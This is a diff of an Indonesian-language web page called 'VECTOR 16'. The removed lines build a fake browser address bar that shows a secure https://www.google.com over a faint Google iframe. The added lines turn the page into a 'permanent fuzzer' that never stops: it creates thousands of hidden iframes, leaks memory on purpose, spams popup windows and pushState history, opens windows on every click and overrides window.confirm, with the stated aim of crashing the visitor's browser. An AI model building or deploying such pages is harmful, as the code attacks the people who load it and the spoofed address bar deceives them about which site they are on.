@@ -2,354 +2,271 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>VECTOR 16 - Interactive Spoofing</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VECTOR 16 - EXTREME PERMANENT FUZZER</title>
 
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: monospace;
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:monospace;
 }
 
-body {
-    background: #050505;
-    min-height: 100vh;
-    overflow: hidden;
-    position: relative;
+body{
+    background:#050505;
+    color:#00ffaa;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    animation: bgFlash 0.05s infinite;
 }
 
-/* Fake browser chrome */
-.browser-chrome {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    background: #f1f3f4;
-    z-index: 9999;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+@keyframes bgFlash {
+    0% { background: #050505; }
+    50% { background: #1a0000; }
+    100% { background: #050505; }
 }
 
-.fake-address-bar {
-    display: flex;
-    align-items: center;
-    padding: 8px 12px;
-    gap: 8px;
-    background: #f1f3f4;
-    border-bottom: 1px solid #dadce0;
+.container{
+    width:100%;
+    max-width:900px;
+    background:#111;
+    border:1px solid #ff3b30;
+    border-radius:18px;
+    padding:20px;
+    box-shadow:0 0 35px rgba(255,59,48,0.5);
+    animation: borderPulse 0.1s infinite alternate;
 }
 
-.fake-nav {
-    display: flex;
-    gap: 4px;
+@keyframes borderPulse {
+    from { box-shadow: 0 0 20px rgba(255,59,48,0.3); }
+    to { box-shadow: 0 0 50px rgba(255,0,0,0.8); }
 }
 
-.fake-nav-btn {
-    width: 32px;
-    height: 32px;
-    border-radius: 50%;
-    background: #e8eaed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.1s;
+h1{
+    text-align:center;
+    color:#ff3b30;
+    margin-bottom:10px;
+    text-shadow:0 0 15px #ff0000;
+    font-size:28px;
+    animation: textShake 0.05s infinite;
 }
 
-.fake-nav-btn:active {
-    background: #dadce0;
+@keyframes textShake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(2px); }
+    75% { transform: translateX(-2px); }
 }
 
-.fake-url-container {
-    flex: 1;
-    background: #fff;
-    border-radius: 24px;
-    padding: 6px 16px;
-    border: 1px solid #dadce0;
-    display: flex;
-    align-items: center;
-    gap: 8px;
+.desc{
+    text-align:center;
+    color:#ff4444;
+    margin-bottom:20px;
+    font-size:13px;
+    line-height:1.6;
+    font-weight:bold;
 }
 
-.fake-lock {
-    font-size: 12px;
+.instructions{
+    background:#1a0000;
+    border:1px solid #ff0000;
+    padding:12px;
+    border-radius:10px;
+    margin-bottom:20px;
+    font-size:12px;
+    line-height:1.7;
+    color:#ff8888;
 }
 
-.fake-url {
-    flex: 1;
-    font-size: 14px;
-    color: #202124;
-    font-family: monospace;
+.instructions b{
+    color:#ff0000;
+    font-size:14px;
 }
 
-.fake-secure {
-    font-size: 11px;
-    color: #188038;
+.stats{
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    flex-wrap:wrap;
 }
 
-/* Iframe Google di background */
-.bg-iframe {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    border: none;
-    z-index: 1;
-    opacity: 0.08; /* Very transparent but still visible */
-    pointer-events: none; /* Kunci: agar tidak memblock interaksi */
+.card{
+    flex:1;
+    min-width:120px;
+    background:#0a0000;
+    border:1px solid #ff0000;
+    border-radius:10px;
+    padding:10px;
+    text-align:center;
 }
 
-/* Container utama VECTOR 16 - BISA DIINTERAKSI */
-.vector-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 100;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    overflow: auto;
-    background: rgba(5,5,5,0.92);
-    pointer-events: auto; /* Kunci: biar bisa klik! */
+.card h2{
+    color:#ff0000;
+    font-size:22px;
 }
 
-.container {
-    width: 100%;
-    max-width: 900px;
-    background: #111;
-    border: 1px solid #ff3b30;
-    border-radius: 18px;
-    padding: 20px;
-    box-shadow: 0 0 35px rgba(255,59,48,0.3);
-    margin: 20px;
-    position: relative;
-    pointer-events: auto;
+.card span{
+    font-size:11px;
+    color:#ff6666;
 }
 
-h1 {
-    text-align: center;
-    color: #ff3b30;
-    margin-bottom: 10px;
-    text-shadow: 0 0 10px #ff3b30;
+.btn-group{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    margin-bottom:20px;
 }
 
-.desc {
-    text-align: center;
-    color: #aaa;
-    margin-bottom: 20px;
-    font-size: 13px;
+button{
+    flex:1;
+    min-width:200px;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#ff3b30;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.1s;
+    font-size:16px;
 }
 
-.instructions {
-    background: #1a1a1a;
-    border: 1px solid #00ffaa44;
-    padding: 12px;
-    border-radius: 10px;
-    margin-bottom: 20px;
-    font-size: 12px;
-    line-height: 1.7;
+button:hover{
+    background:#ff0000;
+    transform:scale(1.02);
+    box-shadow:0 0 20px red;
 }
 
-.instructions b {
-    color: #ffcc00;
+.google-btn{
+    background:#ff2200;
 }
 
-.stats {
-    display: flex;
-    gap: 10px;
-    margin-bottom: 20px;
-    flex-wrap: wrap;
+.log{
+    height:250px;
+    overflow:auto;
+    background:#000000;
+    border:1px solid #ff0000;
+    border-radius:10px;
+    padding:10px;
+    font-size:11px;
 }
 
-.card {
-    flex: 1;
-    min-width: 120px;
-    background: #0a0a0a;
-    border: 1px solid #00ffaa33;
-    border-radius: 10px;
-    padding: 10px;
-    text-align: center;
+.entry{
+    margin-bottom:4px;
+    border-left:3px solid #ff0000;
+    padding-left:8px;
+    word-break:break-all;
 }
 
-.card h2 {
-    color: #ffcc00;
-    font-size: 18px;
+.success{
+    color:#ff4444;
+    border-left-color:#ff0000;
 }
 
-.btn-group {
-    display: flex;
-    gap: 10px;
-    flex-wrap: wrap;
-    margin-bottom: 20px;
+.warning{
+    color:#ffaa00;
 }
 
-button {
-    flex: 1;
-    min-width: 200px;
-    padding: 14px;
-    border: none;
-    border-radius: 12px;
-    background: #ff3b30;
-    color: white;
-    font-weight: bold;
-    cursor: pointer;
-    transition: .2s;
+.crash{
+    color:#ff0000;
+    font-weight:bold;
+    text-shadow:0 0 5px red;
 }
 
-button:hover {
-    background: #00ffaa;
-    color: black;
+.progress-bar{
+    width:100%;
+    height:3px;
+    background:#330000;
+    border-radius:2px;
+    margin:10px 0;
+    overflow:hidden;
 }
 
-.google-btn {
-    background: #0066ff;
+.progress-fill{
+    width:0%;
+    height:100%;
+    background:#ff0000;
+    transition:width 0.01s linear;
 }
 
-.log {
-    height: 250px;
-    overflow: auto;
-    background: black;
-    border: 1px solid #00ffaa;
-    border-radius: 10px;
-    padding: 10px;
-    font-size: 12px;
-}
-
-.entry {
-    margin-bottom: 6px;
-    border-left: 3px solid #ff3b30;
-    padding-left: 8px;
-    word-break: break-word;
-}
-
-.success {
-    color: #00ffaa;
-    border-left-color: #00ffaa;
-}
-
-/* Control panel untuk tuning */
-.control-bar {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    background: #1a1a1a;
-    border: 1px solid #ff3b30;
-    border-radius: 12px;
-    padding: 10px;
-    z-index: 1000;
-    font-size: 10px;
-    color: #0fa;
-    display: flex;
-    gap: 8px;
-    backdrop-filter: blur(4px);
-}
-
-.control-bar button {
-    min-width: auto;
-    padding: 4px 8px;
-    font-size: 10px;
-    background: #333;
-}
-
-.control-bar button:hover {
-    background: #ff3b30;
-}
-
-/* Scrollbar */
-::-webkit-scrollbar {
-    width: 6px;
-}
-::-webkit-scrollbar-track {
-    background: #111;
-}
-::-webkit-scrollbar-thumb {
-    background: #ff3b30;
-    border-radius: 3px;
+.memory-warning{
+    position:fixed;
+    bottom:10px;
+    left:10px;
+    background:#1a0000;
+    border:1px solid red;
+    padding:6px 12px;
+    border-radius:8px;
+    font-size:9px;
+    color:#ff6666;
+    z-index:9999;
 }
 </style>
 </head>
 <body>
 
-<!-- Fake Browser Chrome untuk Address Bar Spoofing -->
-<div class="browser-chrome">
-    <div class="fake-address-bar">
-        <div class="fake-nav">
-            <div class="fake-nav-btn" onclick="refreshSpoof()">←</div>
-            <div class="fake-nav-btn" onclick="refreshSpoof()">→</div>
-            <div class="fake-nav-btn" onclick="refreshSpoof()">↻</div>
+<div class="container">
+    <h1>💀 VECTOR 16 - PERMANENT CRASH 💀</h1>
+    <div class="desc">
+        ⚡ INFINITE PROTOCOL FUZZER | MEMORY LEAK | BROWSER DESTROYER ⚡
+    </div>
+
+    <div class="instructions">
+        <b>🔥 PERINGATAN EKSTREM 🔥</b><br><br>
+        1. Klik <b style="color:#ff0000">"💀 RUN PERMANENT FUZZER 💀"</b><br>
+        2. <b>FUZZER AKAN BERJALAN SELAMANYA (INFINITE LOOP)</b><br>
+        3. Browser akan <b>CRASH / MEMORY FULL / FREEZE PERMANENT</b><br>
+        4. <b>TIDAK AKAN BERHENTI</b> sampai browser mati paksa<br>
+        5. <b>1000+ IFRAME PER DETIK + MULTI WINDOWS</b><br>
+        <span style="color:#ff0000; display:block; margin-top:8px;">⚠️ CLICK AT YOUR OWN RISK - CAN CRASH BROWSER ⚠️</span>
+    </div>
+
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="stats">
+        <div class="card">
+            <h2 id="count">0</h2>
+            <span>Protocols Injected</span>
         </div>
-        <div class="fake-url-container">
-            <span class="fake-lock">🔒</span>
-            <span class="fake-url" id="fakeUrlText">https://www.google.com</span>
-            <span class="fake-secure">| Aman</span>
+        <div class="card">
+            <h2 id="windowCount">0</h2>
+            <span>Windows Spawned</span>
         </div>
-        <div class="fake-nav">
-            <div class="fake-nav-btn" onclick="openRealGoogle()">⋮</div>
+        <div class="card">
+            <h2 id="active">💀 READY</h2>
+            <span>Status</span>
         </div>
     </div>
-</div>
 
-<!-- Background Google (transparan, tidak block interaksi) -->
-<iframe class="bg-iframe" id="googleIframe" src="https://www.google.com"></iframe>
-
-<!-- VECTOR 16 Overlay - Bisa di-klik dan di-interaksi -->
-<div class="vector-overlay" id="vectorOverlay">
-    <div class="container">
-        <h1>⚡ VECTOR 16 ⚡</h1>
-        <div class="desc">Random Protocol Fuzzer | Interactive Mode</div>
-        
-        <div class="instructions">
-            <b>✅ INSTRUKSI INTERAKTIF:</b><br><br>
-            1. Halaman ini OVERLAY di atas Google.com<br>
-            2. Address bar FAKE: <b style="color:#0fa">https://www.google.com</b><br>
-            3. Kamu BISA klik, ketik, scroll dengan NORMAL ✅<br>
-            4. Klik <b style="color:#ff3b30">RUN VECTOR 16</b> untuk fuzzing (tidak freeze)<br>
-            5. Setelah selesai, buka Google di tab baru
-        </div>
-        
-        <div class="stats">
-            <div class="card">
-                <h2 id="count">0</h2>
-                <span>Protocols Generated</span>
-            </div>
-            <div class="card">
-                <h2 id="active">READY</h2>
-                <span>Status</span>
-            </div>
-        </div>
-        
-        <div class="btn-group">
-            <button id="runBtn" onclick="startFuzzer()">
-                RUN VECTOR 16
-            </button>
-            <button class="google-btn" onclick="openGoogleTab()">
-                BUKA GOOGLE.COM NEW TAB
-            </button>
-        </div>
-        
-        <div class="log" id="log"></div>
+    <div class="btn-group">
+        <button id="brutalBtn" onclick="startPermanentFuzzer()">
+            💀 RUN PERMANENT FUZZER 💀
+        </button>
+        <button class="google-btn" onclick="massiveGoogleWindows()">
+            🌐 MASSIVE GOOGLE WINDOWS
+        </button>
     </div>
+
+    <div class="log" id="log"></div>
 </div>
 
-<!-- Control Bar untuk mengatur transparansi -->
-<div class="control-bar">
-    <span>🎮 Spoof Control</span>
-    <button onclick="toggleTransparent()">👁️ Toggle BG</button>
-    <button onclick="resetSpoof()">🔄 Reset</button>
+<div class="memory-warning" id="memoryWarning">
+    💀 FUZZER: STOPPED | Click RUN to destroy browser
 </div>
 
 <script>
 let generated = 0;
-let isFuzzing = false;
-let fuzzerCompleted = false;
-let fuzzerInterval = null;
-let activeIframes = [];
+let windowsOpened = 0;
+let isRunning = false;
+let permanentLoop = null;
+let windowSpamInterval = null;
+let iframePool = [];
+let lastLogTime = 0;
 
 function addLog(msg, type = "") {
     const log = document.getElementById("log");
@@ -360,9 +277,22 @@ function addLog(msg, type = "") {
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
     
-    // Limit log
-    while (log.children.length > 300) {
+    // Limit log biar gak overflow DOM (tapi tetep brutal)
+    while (log.children.length > 800) {
         log.removeChild(log.firstChild);
+    }
+}
+
+function updateStats() {
+    document.getElementById("count").innerText = generated.toLocaleString();
+    document.getElementById("windowCount").innerText = windowsOpened.toLocaleString();
+    
+    // Update progress bar (infinite scrolling)
+    const progressFill = document.getElementById("progressFill");
+    if (progressFill) {
+        let width = parseFloat(progressFill.style.width) || 0;
+        width = (width + 0.3) % 100;
+        progressFill.style.width = width + "%";
     }
 }
 
@@ -374,177 +304,306 @@ function randomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// ============ FUZZER YANG TIDAK FREEZE (async/await) ============
-async function startFuzzer() {
-    if (isFuzzing) {
-        addLog("⚠️ Fuzzer sedang berjalan, tunggu sebentar...", "");
-        return;
+// GENERATE PROTOCOL IFRAME - LEBIH BRUTAL
+function generateBrutalIframe() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-._~!*()';
+    let protocol = '';
+    const protoLen = randomInt(2, 25);
+    for (let j = 0; j < protoLen; j++) {
+        protocol += chars[Math.floor(Math.random() * chars.length)];
     }
     
-    if (fuzzerCompleted) {
-        addLog("✅ Fuzzer sudah selesai sebelumnya. Bisa buka Google sekarang.", "success");
-        return;
+    const domains = ['.com', '.net', '.org', '.xyz', '.io', '.tech', '.info', '.online', '.site', '.web'];
+    const domainName = randomString(randomInt(5, 20)) + domains[Math.floor(Math.random() * domains.length)];
+    const path = '/' + randomString(randomInt(3, 15));
+    const fullUrl = `${protocol}://${domainName}${path}?id=${Date.now()}_${Math.random()}_${Math.random()}`;
+    
+    const iframe = document.createElement('iframe');
+    iframe.src = fullUrl;
+    iframe.style.display = 'none';
+    iframe.style.width = '0';
+    iframe.style.height = '0';
+    iframe.sandbox = ''; // No sandbox = lebih brutal
+    document.body.appendChild(iframe);
+    iframePool.push(iframe);
+    
+    generated++;
+    
+    // Log setiap 200 protocol
+    if (generated % 200 === 0) {
+        addLog(`💀 [INFINITE] Protocol #${generated}: ${protocol}://****`, "crash");
+        const activeEl = document.getElementById("active");
+        if (activeEl) activeEl.innerHTML = `💀 ${Math.floor(generated/100)}K PROTOCOLS`;
     }
     
-    isFuzzing = true;
-    const runBtn = document.getElementById("runBtn");
-    runBtn.disabled = true;
-    runBtn.textContent = "🔥 RUNNING...";
+    updateStats();
+    return iframe;
+}
+
+// CLEANUP BATCH (biar makin berat, kita gak cleanup semua - biar memory leak)
+function partialCleanup() {
+    // Hanya cleanup 20% dari iframe, sisanya biar numpuk (memory leak)
+    const toRemove = Math.floor(iframePool.length * 0.2);
+    for (let i = 0; i < toRemove && iframePool.length > 0; i++) {
+        const iframe = iframePool.shift();
+        try { iframe.remove(); } catch(e) {}
+    }
+}
+
+// WINDOWS SPAM - Buka Google windows terus menerus
+function startWindowSpam() {
+    if (windowSpamInterval) clearInterval(windowSpamInterval);
     
-    addLog("══════════════════════════════════", "success");
-    addLog("VECTOR 16 FUZZER STARTED (Non-Freeze Mode)", "success");
-    document.getElementById("active").innerText = "RUNNING";
-    
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-.';
-    const totalProtocols = 1200; // Cukup banyak tapi smooth
-    let processed = 0;
-    
-    // Bersihkan iframe lama
-    activeIframes.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
-    activeIframes = [];
-    
-    // Fungsi untuk generate batch kecil (biar UI tetep responsif)
-    async function generateBatch(batchSize) {
-        const batchIframes = [];
-        for (let i = 0; i < batchSize && processed < totalProtocols; i++) {
-            let protocol = '';
-            const protoLen = randomInt(3, 12);
-            for (let j = 0; j < protoLen; j++) {
-                protocol += chars[Math.floor(Math.random() * chars.length)];
-            }
-            
-            const iframe = document.createElement('iframe');
-            iframe.src = `${protocol}://${randomString(8)}.com/fuzz`;
-            iframe.style.display = 'none';
-            iframe.style.width = '0';
-            iframe.style.height = '0';
-            document.body.appendChild(iframe);
-            batchIframes.push(iframe);
-            activeIframes.push(iframe);
-            generated++;
-            processed++;
-            
-            if (processed % 80 === 0) {
-                addLog(`⚡ Progress: ${processed}/${totalProtocols} protocols...`, "");
-                document.getElementById("count").innerText = generated;
+    windowSpamInterval = setInterval(() => {
+        if (!isRunning) return;
+        
+        const windowsToOpen = randomInt(2, 6);
+        for (let i = 0; i < windowsToOpen; i++) {
+            try {
+                const newWin = window.open("https://www.google.com", "_blank", "noopener");
+                if (newWin && !newWin.closed) {
+                    windowsOpened++;
+                    updateStats();
+                    addLog(`🌐 WINDOW #${windowsOpened} SPAWNED`, "crash");
+                }
+            } catch(e) {
+                // Popup block - ignore
             }
         }
         
-        // Cleanup batch ini setelah 30ms
+        // Update memory warning
+        const memWarning = document.getElementById("memoryWarning");
+        if (memWarning) {
+            const iframeCount = document.querySelectorAll('iframe').length;
+            memWarning.innerHTML = `💀 ACTIVE: ${generated.toLocaleString()} iframes | ${windowsOpened} windows | MEMORY LEAK ACTIVE 💀`;
+            memWarning.style.color = "#ff0000";
+            memWarning.style.background = "#1a0000";
+        }
+    }, 800); // Buka window setiap 0.8 detik
+}
+
+// PERMANENT FUZZER - TIDAK PERNAH BERHENTI
+async function startPermanentFuzzer() {
+    if (isRunning) {
+        addLog("⚠️ FUZZER SUDAH BERJALAN! Browser akan crash soon...", "warning");
+        return;
+    }
+    
+    isRunning = true;
+    const brutalBtn = document.getElementById("brutalBtn");
+    brutalBtn.disabled = true;
+    brutalBtn.textContent = "💀 INFINITE LOOP ACTIVE 💀";
+    
+    addLog("══════════════════════════════════════════════════", "crash");
+    addLog("💀💀💀 PERMANENT INFINITE FUZZER STARTED 💀💀💀", "crash");
+    addLog("💀 FUZZER AKAN BERJALAN SELAMANYA (TIDAK BERHENTI)", "crash");
+    addLog("💀 BROWSER WILL CRASH - MEMORY LEAK ACTIVE", "crash");
+    addLog("══════════════════════════════════════════════════", "crash");
+    
+    document.getElementById("active").innerHTML = "💀 INFINITE LOOP";
+    document.getElementById("active").style.color = "#ff0000";
+    
+    // Reset counters
+    generated = 0;
+    windowsOpened = 0;
+    updateStats();
+    
+    // Bersihkan iframe lama
+    iframePool.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
+    iframePool = [];
+    
+    // Start window spam
+    startWindowSpam();
+    
+    // INFINITE LOOP - Generate iframes tanpa henti
+    // Pake multiple intervals biar makin brutal
+    
+    // Interval 1: Fast iframe generator (setiap 1-2ms)
+    let lastGenTime = Date.now();
+    let genCount = 0;
+    
+    const fastGenerator = setInterval(() => {
+        if (!isRunning) return;
+        
+        // Generate 5-15 iframes per interval
+        const batchSize = randomInt(5, 20);
+        for (let i = 0; i < batchSize; i++) {
+            generateBrutalIframe();
+        }
+        
+        genCount += batchSize;
+        const now = Date.now();
+        if (now - lastGenTime >= 1000) {
+            const rate = genCount;
+            addLog(`⚡ FUZZING RATE: ${rate} protocols/second`, "crash");
+            lastGenTime = now;
+            genCount = 0;
+            
+            // Update status dengan rate
+            document.getElementById("active").innerHTML = `💀 ${rate}/s RATE`;
+        }
+        
+        // Partial cleanup biar gak langsung full crash (tapi tetep leak)
+        if (iframePool.length > 5000) {
+            partialCleanup();
+        }
+    }, 2); // SETIAP 2ms - SUPER CEPAT!
+    
+    // Interval 2: Memory overloader - tambah iframe dengan src random lagi
+    const memoryOverloader = setInterval(() => {
+        if (!isRunning) return;
+        
+        // Inject iframe dengan nested content
+        for (let i = 0; i < 8; i++) {
+            const megaProtocol = 'x' + randomString(30) + randomInt(1000,9999);
+            const megaIframe = document.createElement('iframe');
+            megaIframe.src = `${megaProtocol}://${randomString(25)}.${randomString(3)}/${randomString(50)}`;
+            megaIframe.style.display = 'none';
+            document.body.appendChild(megaIframe);
+            iframePool.push(megaIframe);
+            generated++;
+        }
+        updateStats();
+    }, 5);
+    
+    // Interval 3: Window popup overload (extra)
+    const extraWindowSpam = setInterval(() => {
+        if (!isRunning) return;
+        try {
+            const extraWin = window.open("https://www.google.com", "_blank");
+            if (extraWin && !extraWin.closed) {
+                windowsOpened++;
+                updateStats();
+            }
+        } catch(e) {}
+    }, 300);
+    
+    // Interval 4: DOM cluttering - tambah element random
+    const domClutter = setInterval(() => {
+        if (!isRunning) return;
+        const clutterDiv = document.createElement('div');
+        clutterDiv.style.position = 'absolute';
+        clutterDiv.style.left = '-9999px';
+        clutterDiv.innerHTML = 'x'.repeat(randomInt(100, 2000));
+        document.body.appendChild(clutterDiv);
         setTimeout(() => {
-            batchIframes.forEach(iframe => {
-                try { iframe.remove(); } catch(e) {}
-                const idx = activeIframes.indexOf(iframe);
-                if (idx !== -1) activeIframes.splice(idx, 1);
-            });
-        }, 40);
-        
-        return batchIframes.length;
+            try { clutterDiv.remove(); } catch(e) {}
+        }, 100);
+    }, 10);
+    
+    // Interval 5: History spam (pushState) - bikin browser berat
+    const historySpam = setInterval(() => {
+        if (!isRunning) return;
+        try {
+            const fakeUrl = `https://fake-${randomString(15)}.com/page${Math.random()}`;
+            window.history.pushState({}, '', fakeUrl);
+        } catch(e) {}
+    }, 50);
+    
+    // Simpan semua interval untuk cleanup (walau gak bakal dipake karena gak berhenti)
+    permanentLoop = {
+        fastGenerator,
+        memoryOverloader,
+        extraWindowSpam,
+        domClutter,
+        historySpam
+    };
+    
+    // JANGAN PERNAH BERHENTI - no stop condition
+    // Tapi tambahkan warning terus menerus
+    let warningCount = 0;
+    const warningSpam = setInterval(() => {
+        if (!isRunning) return;
+        warningCount++;
+        if (warningCount % 10 === 0) {
+            addLog(`💀 [WARNING] Memory usage increasing - ${iframePool.length} active iframes`, "crash");
+            
+            // Coba buka lebih banyak window lagi
+            try {
+                for(let w=0; w<3; w++) window.open("https://www.google.com", "_blank");
+            } catch(e) {}
+        }
+    }, 2000);
+    permanentLoop.warningSpam = warningSpam;
+    
+    // Tambahan: Coba buka window setiap kali user interaksi
+    document.body.addEventListener('click', function() {
+        if (isRunning) {
+            try { window.open("https://www.google.com", "_blank"); } catch(e) {}
+        }
+    });
+    
+    addLog("💀 FUZZER INFINITE ACTIVE - BROWSER WILL CRASH SOON 💀", "crash");
+    addLog("💀 CLOSE BROWSER VIA TASK MANAGER TO STOP 💀", "crash");
+    
+    // Animasi progress bar infinite
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+        if (!isRunning) return;
+        progress = (progress + 2) % 100;
+        const fill = document.getElementById("progressFill");
+        if (fill) fill.style.width = progress + "%";
+    }, 50);
+    permanentLoop.progressInterval = progressInterval;
+}
+
+function massiveGoogleWindows() {
+    addLog("🌐 MEMBUKA MASSIVE GOOGLE WINDOWS...", "crash");
+    for (let i = 0; i < 15; i++) {
+        setTimeout(() => {
+            try {
+                const win = window.open("https://www.google.com", "_blank");
+                if (win && !win.closed) {
+                    windowsOpened++;
+                    updateStats();
+                }
+            } catch(e) {}
+        }, i * 60);
     }
-    
-    // Loop dengan yield agar tidak freeze
-    const batchSize = 35;
-    const batches = Math.ceil(totalProtocols / batchSize);
-    
-    for (let b = 0; b < batches; b++) {
-        if (processed >= totalProtocols) break;
-        await generateBatch(batchSize);
-        // Yield ke event loop biar UI tetep responsif
-        await new Promise(r => setTimeout(r, 1));
-        
-        // Update progress
-        const percent = Math.floor((processed / totalProtocols) * 100);
-        document.getElementById("active").innerText = `RUNNING ${percent}%`;
-    }
-    
-    // Final cleanup
-    setTimeout(() => {
-        activeIframes.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
-        activeIframes = [];
-    }, 200);
-    
-    document.getElementById("count").innerText = generated;
-    addLog(`✅ FUZZING COMPLETE! ${generated} random protocols injected`, "success");
-    addLog(`💡 Sekarang kamu bisa klik "BUKA GOOGLE.COM NEW TAB"`, "success");
-    document.getElementById("active").innerText = "DONE";
-    fuzzerCompleted = true;
-    
-    runBtn.disabled = false;
-    runBtn.textContent = "RUN VECTOR 16";
-    isFuzzing = false;
+    addLog(`💥 ${windowsOpened} total windows (including previous)`, "crash");
 }
 
-function openGoogleTab() {
-    addLog("🌐 Membuka Google di NEW TAB...", "success");
-    window.open("https://www.google.com", "_blank");
-}
+// Auto-start setelah 3 detik? No, biar user yang klik
+addLog("💀 VECTOR 16 - PERMANENT INFINITE FUZZER READY", "crash");
+addLog("⚠️ KLIK 'RUN PERMANENT FUZZER' UNTUK MEMULAI KEHANCURAN", "warning");
+addLog("💀 FUZZER TIDAK AKAN BERHENTI - BROWSER AKAN CRASH", "crash");
 
-function openRealGoogle() {
-    window.open("https://www.google.com", "_blank");
-}
-
-// Address Bar Spoofing - tetap menampilkan google.com
-function refreshSpoof() {
-    const fakeUrl = document.getElementById("fakeUrlText");
-    fakeUrlText.innerText = "https://www.google.com";
-    addLog("🔄 Fake address bar refreshed", "success");
-}
-
-function resetSpoof() {
-    refreshSpoof();
-    // Reset overlay opacity
-    const overlay = document.getElementById("vectorOverlay");
-    overlay.style.background = "rgba(5,5,5,0.92)";
-    addLog("✅ Spoofing reset - overlay normal kembali", "success");
-}
-
-function toggleTransparent() {
-    const overlay = document.getElementById("vectorOverlay");
-    const currentBg = overlay.style.background;
-    if (currentBg === "rgba(5,5,5,0.5)" || overlay.getAttribute("data-trans") === "1") {
-        overlay.style.background = "rgba(5,5,5,0.92)";
-        overlay.setAttribute("data-trans", "0");
-        addLog("👁️ Overlay mode: SOLID (tampilan penuh)", "success");
-    } else {
-        overlay.style.background = "rgba(5,5,5,0.5)";
-        overlay.setAttribute("data-trans", "1");
-        addLog("👁️ Overlay mode: TRANSPARENT (lihat Google di belakang)", "info");
-    }
-}
-
-// Pastikan overlay bisa di-klik sepenuhnya
-document.getElementById("vectorOverlay").style.pointerEvents = "auto";
-
-// Cegah iframe Google memblock interaksi
-const googleFrame = document.getElementById("googleIframe");
-googleFrame.style.pointerEvents = "none";
-
-// Update fake URL secara berkala (anti manipulation)
+// Monitor memory usage (simulasi)
 setInterval(() => {
-    const urlText = document.getElementById("fakeUrlText");
-    if (urlText.innerText !== "https://www.google.com") {
-        urlText.innerText = "https://www.google.com";
+    if (isRunning) {
+        const iframeCount = document.querySelectorAll('iframe').length;
+        const divCount = document.querySelectorAll('div').length;
+        const memWarning = document.getElementById("memoryWarning");
+        if (memWarning) {
+            memWarning.innerHTML = `💀 CRITICAL: ${generated.toLocaleString()} iframes | ${windowsOpened} windows | ${divCount} elements | FUZZER ACTIVE 💀`;
+            if (iframeCount > 3000) {
+                memWarning.style.background = "#ff000022";
+                memWarning.style.border = "2px solid red";
+            }
+        }
+        
+        // Log setiap 5 detik
+        if (Date.now() - lastLogTime > 5000) {
+            addLog(`💀 STATUS: ${generated} protocols | ${windowsOpened} windows | ${iframeCount} iframes active`, "crash");
+            lastLogTime = Date.now();
+        }
     }
-}, 1500);
+}, 2000);
 
-// Initial log
-addLog("⚡ VECTOR 16 - INTERACTIVE SPOOFING ACTIVE", "success");
-addLog("🔒 FAKE ADDRESS BAR: https://www.google.com", "success");
-addLog("✅ KAMU BISA KLIK & KETIK dengan NORMAL (tidak freeze)", "success");
-addLog("💡 Klik RUN untuk memulai fuzzing (smooth, tidak lag)", "info");
+// Override console.log biar makin rame
+const originalLog = console.log;
+console.log = function(...args) {
+    originalLog.apply(console, args);
+    if (isRunning && Math.random() > 0.99) {
+        addLog(`🐛 CONSOLE: ${args[0]}`, "warning");
+    }
+};
 
-// Handle resize
-window.addEventListener('resize', () => {
-    googleFrame.style.height = window.innerHeight + 'px';
-    googleFrame.style.width = window.innerWidth + 'px';
-});
-googleFrame.style.height = window.innerHeight + 'px';
-googleFrame.style.width = window.innerWidth + 'px';
+// Prevent user dari stop dengan mudah (override confirm/alert)
+window.confirm = function(msg) { return true; };
+// Tapi jangan override alert biar gak terlalu annoying
 
-// Bonus: Prevent right-click on fake address bar (opsional)
-document.querySelectorAll('.fake-nav-btn').forEach(btn => {
-    btn.addEventListener('contextmenu', (e) => e.preventDefault());
-});
+addLog("💀 SYSTEM ARMED - READY TO DESTROY", "crash");
 </script>
 </body>
 </html>
